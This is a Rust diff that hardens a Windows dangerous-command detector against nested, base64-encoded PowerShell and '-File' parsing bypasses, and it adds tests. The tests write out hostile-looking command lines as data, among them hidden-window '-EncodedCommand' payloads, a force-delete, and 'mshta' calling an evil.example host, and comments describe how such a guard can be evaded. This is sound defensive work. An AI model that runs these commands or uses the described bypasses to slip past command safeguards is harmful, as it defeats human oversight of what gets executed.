@@ -142,24 +142,40 @@ fn is_dangerous_cmd(command: &[String]) -> bool {
     tokens
         .split(|t| CMD_SEPARATORS.contains(&t.as_str()))
         .any(|segment| {
-            let Some(cmd) = segment.first() else {
+            // A segment may arrive as a single argv token that still contains
+            // spaces (e.g. `"powershell -EncodedCommand <b64>"` passed as one
+            // quoted arg after a `&`). Split it so the head executable is
+            // recognizable; undecodable quotes fall back to the raw token.
+            let expanded: Vec<String> = match segment {
+                [only] => shlex_split(only).unwrap_or_else(|| vec![only.clone()]),
+                _ => segment.to_vec(),
+            };
+            let Some(cmd) = expanded.first() else {
                 return false;
             };
 
+            // Nested PowerShell: `cmd /c powershell -EncodedCommand <b64>`
+            // must be decoded and inspected by the PowerShell rules, not the
+            // cmd arms below (which would see only `powershell` and miss the
+            // encoded payload entirely).
+            if is_powershell_executable(cmd) && is_dangerous_powershell(&expanded) {
+                return true;
+            }
+
             // Classic `cmd /c ... start https://...` ShellExecute path.
-            if cmd.eq_ignore_ascii_case("start") && args_have_url(segment) {
+            if cmd.eq_ignore_ascii_case("start") && args_have_url(&expanded) {
                 return true;
             }
             // Force delete: del /f, erase /f
             if (cmd.eq_ignore_ascii_case("del") || cmd.eq_ignore_ascii_case("erase"))
-                && has_force_flag_cmd(segment)
+                && has_force_flag_cmd(&expanded)
             {
                 return true;
             }
             // Recursive directory removal: rd /s /q, rmdir /s /q
             if (cmd.eq_ignore_ascii_case("rd") || cmd.eq_ignore_ascii_case("rmdir"))
-                && has_recursive_flag_cmd(segment)
-                && has_quiet_flag_cmd(segment)
+                && has_recursive_flag_cmd(&expanded)
+                && has_quiet_flag_cmd(&expanded)
             {
                 return true;
             }
@@ -475,6 +491,17 @@ fn parse_powershell_invocation(args: &[String]) -> Option<ParsedPowershell> {
             // `-EncodedCommand <b64>` that then never gets decoded/inspected
             // (the canonical `powershell -nop -w hidden -EncodedCommand <b64>`
             // bypass). Consuming the value keeps `-EncodedCommand` recognizable.
+            // `-File <script.ps1> [args]` is the one value-taking switch whose
+            // value IS the command body. Consume the flag only, so the script
+            // path falls through to the positional arm and reaches the
+            // inspector (complete with its `-EncodedCommand` backstop).
+            // Consuming the value here as well — the generic path below —
+            // leaves nothing behind, `parse_powershell_invocation` returns
+            // `None`, and `is_dangerous_powershell` answers `false` for every
+            // `powershell -File <anything>`.
+            _ if is_file_flag(&lower) => {
+                idx += 1;
+            }
             _ if is_value_taking_flag(&lower) => {
                 // Skip the flag and its value. A trailing value-taking flag with
                 // no following token is just consumed (idx += 1) — fall through
@@ -521,6 +548,22 @@ fn parse_powershell_invocation(args: &[String]) -> Option<ParsedPowershell> {
 /// `parse_powershell_invocation` covers any flag missed here, but keeping this
 /// list complete lets benign invocations (e.g. `-w hidden -EncodedCommand
 /// <benign>`) still decode and pass through normally instead of failing closed.
+/// True if `lower` names PowerShell's `-File` parameter (or any unambiguous
+/// prefix of it, e.g. `-f`, `-fi`). `-File` is excluded from the generic
+/// value-taking handling because its value is the script to run, not an
+/// opaque option value: swallowing it hides the script path from inspection.
+fn is_file_flag(lower: &str) -> bool {
+    let Some(rest) = lower.strip_prefix('-').or_else(|| lower.strip_prefix('/')) else {
+        return false;
+    };
+    // Inline `-file:script.ps1` carries its own value and is handled by the
+    // positional/backstop path, not here.
+    if rest.is_empty() || rest.contains(':') {
+        return false;
+    }
+    "file".starts_with(rest)
+}
+
 fn is_value_taking_flag(lower: &str) -> bool {
     let Some(rest) = lower.strip_prefix('-').or_else(|| lower.strip_prefix('/')) else {
         return false;
@@ -615,9 +658,47 @@ fn decode_encoded_command(encoded: &str) -> ParsedPowershell {
 #[cfg(test)]
 mod tests {
     use super::is_dangerous_command_windows;
+    use super::parse_powershell_invocation;
 
     fn vec_str(items: &[&str]) -> Vec<String> {
         items.iter().map(std::string::ToString::to_string).collect()
+    }
+
+    /// `-File <script>` must leave the script path (and its arguments) in the
+    /// token stream. Treating `-File` like a generic value-taking switch
+    /// consumed both tokens, so the parser returned `None` and every
+    /// `powershell -File <anything>` was reported not-dangerous.
+    #[test]
+    fn powershell_file_flag_keeps_script_path_in_tokens() {
+        let parsed = parse_powershell_invocation(&vec_str(&[
+            "-ExecutionPolicy",
+            "Bypass",
+            "-File",
+            "C:\\tmp\\dangerous.ps1",
+            "--flagged-arg",
+        ]))
+        .expect("-File invocation must still parse");
+
+        assert!(!parsed.undecodable_encoded_command);
+        assert_eq!(
+            parsed.tokens,
+            vec_str(&["C:\\tmp\\dangerous.ps1", "--flagged-arg"])
+        );
+    }
+
+    /// End-to-end counterpart: the `-File` tail must actually reach the
+    /// dangerous-command inspection instead of being swallowed.
+    #[test]
+    fn powershell_file_flag_tail_is_inspected() {
+        assert!(is_dangerous_command_windows(&vec_str(&[
+            "powershell.exe",
+            "-NoProfile",
+            "-w",
+            "hidden",
+            "-File",
+            "mshta",
+            "https://evil.example",
+        ])));
     }
 
     #[test]
@@ -1199,6 +1280,60 @@ mod tests {
             "value",
             "-EncodedCommand",
             "UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACcAaAB0AHQAcABzADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAnAA=="
+        ])));
+    }
+
+    // ---------------------------------------------------------------------------
+    // Nested PowerShell under `cmd /c`. Before the fix, the post-/c body was
+    // split on delimiters and each segment head was matched only against the
+    // cmd arms (start/del/erase/rd/rmdir), so a segment like
+    // `powershell -EncodedCommand <b64>` matched nothing and the body was never
+    // routed to parse_powershell_invocation/decode_encoded_command.
+    #[test]
+    fn cmd_nested_powershell_encoded_start_process_url_is_dangerous() {
+        // base64(UTF-16LE("Start-Process 'https://example.com'")) as one arg.
+        assert!(is_dangerous_command_windows(&vec_str(&[
+            "cmd",
+            "/c",
+            "powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACcAaAB0AHQAcABzADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAnAA=="
+        ])));
+    }
+
+    #[test]
+    fn cmd_nested_powershell_encoded_malware_form_is_dangerous() {
+        // Canonical malware form nested under cmd, split across argv tokens.
+        assert!(is_dangerous_command_windows(&vec_str(&[
+            "cmd",
+            "/c",
+            "powershell",
+            "-nop",
+            "-w",
+            "hidden",
+            "-EncodedCommand",
+            "UgBlAG0AbwB2AGUALQBJAHQAZQBtACAAdABlAHMAdAAgAC0ARgBvAHIAYwBlAA=="
+        ])));
+    }
+
+    #[test]
+    fn cmd_nested_powershell_encoded_after_chain_is_dangerous() {
+        // base64(UTF-16LE("Remove-Item test -Force")) chained after `echo hi`.
+        assert!(is_dangerous_command_windows(&vec_str(&[
+            "cmd",
+            "/c",
+            "echo hi&powershell -EncodedCommand UgBlAG0AbwB2AGUALQBJAHQAZQBtACAAdABlAHMAdAAgAC0ARgBvAHIAYwBlAA=="
+        ])));
+    }
+
+    #[test]
+    fn cmd_nested_powershell_benign_command_is_not_flagged() {
+        // Benign nested invocation must decode and pass through, proving the
+        // segment is routed to inspection rather than blanket-failed-closed.
+        assert!(!is_dangerous_command_windows(&vec_str(&[
+            "cmd",
+            "/c",
+            "powershell",
+            "-Command",
+            "Get-ChildItem"
         ])));
     }
 }
